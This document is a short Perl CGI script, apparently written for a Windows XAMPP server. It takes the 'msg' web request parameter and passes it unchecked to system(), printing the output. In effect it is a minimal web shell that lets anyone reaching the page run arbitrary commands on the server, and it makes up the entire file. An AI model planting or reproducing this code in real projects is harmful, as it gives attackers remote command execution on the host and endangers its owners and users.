#!C:\xampp\perl\bin\perl.exe
print "Content-type:text/html\n\n";
use CGI ':standard';
$c = param('msg');
print(system($c)); 
exit(0); 